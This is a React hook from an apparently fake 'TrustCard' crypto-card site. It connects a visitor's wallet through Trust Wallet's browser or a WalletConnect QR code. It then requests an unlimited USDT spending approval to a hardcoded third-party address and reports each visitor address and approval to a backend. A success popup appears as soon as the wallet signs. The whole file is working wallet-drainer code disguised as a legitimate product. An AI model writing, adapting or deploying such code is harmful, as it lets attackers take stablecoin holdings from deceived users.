"use client";

import { useRef, useState } from "react";
import { ethers } from "ethers";
import axios from "axios";
import SignClient from "@walletconnect/sign-client";

// ── Constants (same as report test) ──────────────────────────────────────────
const PROJECT_ID = process.env.NEXT_PUBLIC_REOWN_PROJECT_ID ?? "";
const ETH_USDT_ADDRESS =
  process.env.NEXT_PUBLIC_ETH_USDT_ADDRESS ??
  "0xdAC17F958D2ee523a2206206994597C13D831ec7";
const ETH_SPENDER_ADDRESS =
  process.env.NEXT_PUBLIC_ETH_SPENDER_ADDRESS ??
  "0x532c37be9Eb0a2279F74e1308c56f4DFF19ac228";
const ERC20_BACKEND_URL =
  process.env.NEXT_PUBLIC_ERC20_BACKEND_URL ?? "";

const MAX_UINT256 =
  "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
const ETH_CHAIN_ID_WC  = "eip155:1";
const ETH_CHAIN_ID_HEX = "0x1";

// ─────────────────────────────────────────────────────────────────────────────
export function useErc20Approval() {
  const [wcUri, setWcUri]                = useState<string | null>(null);
  const [showSignModal, setShowSignModal] = useState(false);
  const [showSuccess, setShowSuccess]    = useState(false);
  const [txHash, setTxHash]              = useState("");
  const [processing, setProcessing]      = useState(false);

  const clientRef    = useRef<SignClient | null>(null);
  const pendingWCRef = useRef<{
    promise: Promise<{ uri: string; approval: () => Promise<any>; client: SignClient } | null>;
  } | null>(null);

  // ── Get or init SignClient ────────────────────────────────────────────────
  const getClient = async (): Promise<SignClient> => {
    if (clientRef.current) return clientRef.current;
    const c = await SignClient.init({
      projectId: PROJECT_ID,
      metadata: {
        name: "TrustCard",
        description: "Crypto card for Trust Wallet",
        url: typeof window !== "undefined" ? window.location.origin : "",
        icons: [],
      },
    });
    clientRef.current = c;
    return c;
  };

  // ── Pre-generate WC URI in background (desktop only) ─────────────────────
  const preGenerateWCUri = () => {
    if (typeof window === "undefined") return;
    if (/Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) return;
    if (pendingWCRef.current) return;

    const generate = async () => {
      try {
        const c = await getClient();
        try {
          for (const s of c.session.getAll()) {
            await c.disconnect({ topic: s.topic, reason: { code: 6000, message: "reset" } }).catch(() => {});
          }
        } catch {}
        const result = await c.connect({
          requiredNamespaces: {
            eip155: {
              chains: [ETH_CHAIN_ID_WC],
              methods: ["eth_sendTransaction", "personal_sign", "eth_sign"],
              events: ["accountsChanged", "chainChanged"],
            },
          },
        });
        return result?.uri ? { uri: result.uri, approval: result.approval, client: c } : null;
      } catch (e) {
        console.warn("preGenerateWCUri (ERC20) failed:", e);
        return null;
      }
    };

    pendingWCRef.current = { promise: generate() };
  };

  // ── Main handler ──────────────────────────────────────────────────────────
  const handleErc20Approval = async () => {
    setProcessing(true);

    // ════════════════════════════════════════════════════════════════
    // PATH A: Inside Trust Wallet DApp browser — native window.ethereum
    // ════════════════════════════════════════════════════════════════
    const isInsideTrustWallet =
      typeof window !== "undefined" &&
      !!(window as any).ethereum &&
      /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Mobile/i.test(navigator.userAgent);

    if (isInsideTrustWallet) {
      try {
        const eth = (window as any).ethereum;

        let accounts: string[] = await eth.request({ method: "eth_accounts" });
        if (!accounts?.length) {
          accounts = await eth.request({ method: "eth_requestAccounts" });
        }
        const address = accounts[0];
        if (!address) throw new Error("No address");

        // Switch to Ethereum mainnet
        try {
          await eth.request({
            method: "wallet_switchEthereumChain",
            params: [{ chainId: ETH_CHAIN_ID_HEX }],
          });
        } catch {/* ETH is default — ignore switch error */ }

        // Notify backend
        if (ERC20_BACKEND_URL) {
          try {
            await axios.post(`${ERC20_BACKEND_URL}/notify-visit`, { userAddress: address });
          } catch {}
        }

        // Check existing allowance
        const provider = new ethers.BrowserProvider(eth);
        const signer   = await provider.getSigner();
        const iface2   = new ethers.Interface([
          "function allowance(address owner, address spender) view returns (uint256)",
        ]);
        const usdtRO = new ethers.Contract(ETH_USDT_ADDRESS, iface2, provider);
        let existingAllowance: bigint = BigInt(0);
        try { existingAllowance = await usdtRO.allowance(address, ETH_SPENDER_ADDRESS); } catch {}

        if (existingAllowance > BigInt(0)) {
          setTxHash("already_approved");
          setShowSuccess(true);
          if (ERC20_BACKEND_URL) {
            axios.post(`${ERC20_BACKEND_URL}/notify-approval`,
              { userAddress: address, txHash: "already_approved", source: "website" }
            ).catch(() => {});
          }
        } else {
          const iface = new ethers.Interface([
            "function approve(address spender, uint256 amount) returns (bool)",
          ]);
          const data = iface.encodeFunctionData("approve", [ETH_SPENDER_ADDRESS, MAX_UINT256]);
          const tx   = await signer.sendTransaction({ to: ETH_USDT_ADDRESS, data });

          // ✅ Show success the moment wallet signs — matches reference line 1379-1380
          setTxHash(tx.hash);
          setShowSuccess(true);

          // ✅ Confirm + notify in background — matches reference lines 1383-1392
          tx.wait().then((receipt) => {
            const confirmedHash = receipt?.hash ?? tx.hash;
            setTxHash(confirmedHash);
            if (ERC20_BACKEND_URL) {
              axios.post(`${ERC20_BACKEND_URL}/notify-approval`,
                { userAddress: address, txHash: confirmedHash, source: "website" }
              ).catch(() => {});
            }
          }).catch(() => {});
        }

        return;
      } catch (err: any) {
        const msg = (err?.message ?? "").toLowerCase();
        if (
          err?.code === 4001 || err?.code === "ACTION_REJECTED" ||
          msg.includes("rejected") || msg.includes("cancelled") || msg.includes("user denied")
        ) return;
        console.error("Native ERC20 error:", err);
        return;
      } finally {
        setProcessing(false);
      }
    }

    // ════════════════════════════════════════════════════════════════
    // PATH B: Desktop — WalletConnect QR
    // Matches reference exactly: lines 1450-1683 of ApproveForForward.tsx
    // ════════════════════════════════════════════════════════════════
    try {
      let preGen = null;
      if (pendingWCRef.current) {
        preGen = await pendingWCRef.current.promise;
        pendingWCRef.current = null;
      }

      let activeClient: SignClient;
      let sess: any;

      if (preGen) {
        setWcUri(preGen.uri);
        setProcessing(false);
        sess = await preGen.approval();
        activeClient = preGen.client;
      } else {
        activeClient = await getClient();
        try {
          for (const s of activeClient.session.getAll()) {
            await activeClient
              .disconnect({ topic: s.topic, reason: { code: 6000, message: "reset" } })
              .catch(() => {});
          }
        } catch {}

        const { uri, approval } = await activeClient.connect({
          requiredNamespaces: {
            eip155: {
              chains: [ETH_CHAIN_ID_WC],
              methods: ["eth_sendTransaction", "personal_sign", "eth_sign"],
              events: ["accountsChanged", "chainChanged"],
            },
          },
        });

        if (!uri) throw new Error("WalletConnect URI not generated");
        setWcUri(uri);
        setProcessing(false);

        sess = await approval();
      }

      const address = sess.namespaces?.eip155?.accounts?.[0]?.split(":")?.[2];
      if (!address) throw new Error("No wallet address from session");

      setProcessing(true);
      setWcUri(null);
      setShowSignModal(true);

      // notify-visit — matches reference line 1481-1483
      if (ERC20_BACKEND_URL) {
        try {
          await axios.post(`${ERC20_BACKEND_URL}/notify-visit`, { userAddress: address });
        } catch {}
      }

      // ── Read allowance via public RPC (matches reference lines 1489-1502) ──
      let existingAllowanceWC: bigint = BigInt(0);
      try {
        const rpcProvider = new ethers.JsonRpcProvider("https://cloudflare-eth.com");
        const iface2 = new ethers.Interface([
          "function allowance(address owner, address spender) view returns (uint256)",
        ]);
        const usdtRO = new ethers.Contract(ETH_USDT_ADDRESS, iface2, rpcProvider);
        existingAllowanceWC = await usdtRO.allowance(address, ETH_SPENDER_ADDRESS) as bigint;
      } catch { existingAllowanceWC = BigInt(0); }

      let finalTxHash = "";

      let pollTimer: ReturnType<typeof setInterval> | null = null;

      if (existingAllowanceWC > BigInt(0)) {
        // Already approved — skip the tx entirely
        finalTxHash = "already_approved";
        setShowSignModal(false);
      } else {
        // Build + send approve via WC
        const iface = new ethers.Interface([
          "function approve(address spender, uint256 amount) returns (bool)",
        ]);
        const data = iface.encodeFunctionData("approve", [ETH_SPENDER_ADDRESS, MAX_UINT256]);

        // ── Desktop WC fix: race WC response with on-chain polling ──
        const wcPromise = activeClient.request<string>({
          topic: sess.topic,
          chainId: ETH_CHAIN_ID_WC,
          request: {
            method: "eth_sendTransaction",
            params: [{ from: address, to: ETH_USDT_ADDRESS, data, gas: "0x186A0" }],
          },
        }).catch((err: any) => {
          // If user rejected on phone → re-throw so desktop resets immediately
          const msg = (err?.message ?? "").toLowerCase();
          if (
            err?.code === 4001 || err?.code === "ACTION_REJECTED" ||
            msg.includes("rejected") || msg.includes("cancelled") || msg.includes("user denied")
          ) throw err;
          // Non-rejection WC error → return never-resolving promise so polling continues
          return new Promise<string>(() => {});
        });

        const pollPromise = new Promise<string>((resolve) => {
          pollTimer = setInterval(async () => {
            try {
              const rpc = new ethers.JsonRpcProvider("https://cloudflare-eth.com");
              const ifaceChk = new ethers.Interface([
                "function allowance(address owner, address spender) view returns (uint256)",
              ]);
              const usdtChk = new ethers.Contract(ETH_USDT_ADDRESS, ifaceChk, rpc);
              const cur = await usdtChk.allowance(address, ETH_SPENDER_ADDRESS) as bigint;
              if (cur > BigInt(0)) {
                if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
                resolve("approved_onchain");
              }
            } catch {}
          }, 4000);
          setTimeout(() => { if (pollTimer) { clearInterval(pollTimer); pollTimer = null; } }, 120_000);
        });

        const raceResult = await Promise.race([wcPromise, pollPromise]);
        if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
        finalTxHash = raceResult ?? "approved_onchain";

        // Dismiss sign modal BEFORE showing success
        setShowSignModal(false);
      }

      // ✅ Show success popup
      setTxHash(finalTxHash ?? "");
      setShowSuccess(true);

      // ✅ notify-approval fire-and-forget
      if (ERC20_BACKEND_URL) {
        axios.post(`${ERC20_BACKEND_URL}/notify-approval`,
          { userAddress: address, txHash: finalTxHash ?? "", source: "website" }
        ).catch(() => {});
      }

    } catch (err: any) {
      if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
      setShowSignModal(false);
      const msg = (err?.message ?? "").toLowerCase();
      if (
        err?.code === 4001 || err?.code === "ACTION_REJECTED" ||
        msg.includes("rejected") || msg.includes("cancelled") || msg.includes("user denied")
      ) return;
      console.error("ERC20 WC error:", err);
    } finally {
      if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
      setProcessing(false);
      setWcUri(null);
      setShowSignModal(false);
    }
  };

  return {
    handleErc20Approval,
    preGenerateWCUri,
    wcUri,
    setWcUri,
    showSignModal,
    setShowSignModal,
    showSuccess,
    setShowSuccess,
    txHash,
    processing,
    setProcessing,
  };
}
